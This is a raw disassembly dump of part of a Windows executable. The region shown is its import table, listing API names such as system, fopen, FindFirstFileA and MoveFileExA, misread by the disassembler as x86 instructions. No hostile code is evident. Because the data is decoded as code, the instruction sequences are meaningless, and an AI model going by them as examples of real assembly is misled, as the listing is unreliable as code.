  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
